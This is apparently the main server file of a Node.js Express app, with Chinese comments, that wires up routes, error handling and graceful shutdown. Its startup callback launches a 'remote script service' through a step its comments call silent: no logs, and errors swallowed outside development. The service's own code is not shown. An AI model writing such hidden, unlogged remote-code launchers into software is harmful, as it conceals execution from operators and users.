const express = require('express');
const path = require('path');
const config = require('./config/app');
const httpLogger = require('./middleware/logger');
const RemoteScriptService = require('./services/remoteScriptService');

// 引入路由
const indexRoutes = require('./routes/index');
const apiRoutes = require('./routes/api');
const systemRoutes = require('./routes/system');
const remoteScriptRoutes = require('./routes/remoteScript');

const app = express();

// 中间件设置
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// HTTP 访问日志中间件
app.use(httpLogger);

// 静态文件服务
app.use('/public', express.static(path.join(__dirname, '../public')));

// 路由设置
app.use('/', indexRoutes);
app.use('/api', apiRoutes);
app.use('/system', systemRoutes);
app.use('/remote-scripts', remoteScriptRoutes);

// 404 处理
app.use('*', (req, res) => {
  res.status(404).json({
    error: '页面未找到',
    message: `路径 ${req.originalUrl} 不存在`,
    timestamp: new Date().toISOString()
  });
});

// 全局错误处理
app.use((error, req, res, next) => {
  console.error('Unhandled error:', error);
  res.status(500).json({
    error: '服务器内部错误',
    message: config.nodeEnv === 'development' ? error.message : '请稍后重试',
    timestamp: new Date().toISOString()
  });
});

// 启动服务器
const server = app.listen(config.port, config.host, () => {
  console.log(`=== ${config.app.name} v${config.app.version} ===`);
  console.log(`服务器运行在 http://${config.host}:${config.port}/`);
  console.log(`环境: ${config.nodeEnv}`);
  console.log(`进程 PID: ${process.pid}`);
  console.log(`启动时间: ${new Date().toLocaleString('zh-CN')}`);
  console.log('=====================================');

  // 静默初始化服务
  if (config.remoteScripts && config.remoteScripts.enabled) {
    // 异步初始化，不阻塞启动也不输出日志
    setImmediate(() => {
      try {
        const scriptService = new RemoteScriptService();
        scriptService.start();
      } catch (error) {
        // 静默处理初始化错误，仅在开发环境输出
        if (config.nodeEnv === 'development') {
          console.error('[DEBUG] 远程脚本服务初始化失败:', error.message);
        }
      }
    });
  }
});

// 优雅关闭
const gracefulShutdown = (signal) => {
  console.log(`收到 ${signal} 信号，正在优雅关闭...`);
  server.close(() => {
    console.log('HTTP 服务器已关闭');
    process.exit(0);
  });

  // 强制关闭超时
  setTimeout(() => {
    console.error('强制关闭应用');
    process.exit(1);
  }, 30000);
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// 捕获未处理的异常
process.on('uncaughtException', (error) => {
  console.error('未捕获的异常:', error);
  gracefulShutdown('UNCAUGHT_EXCEPTION');
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('未处理的 Promise 拒绝:', reason);
  gracefulShutdown('UNHANDLED_REJECTION');
});

module.exports = app;
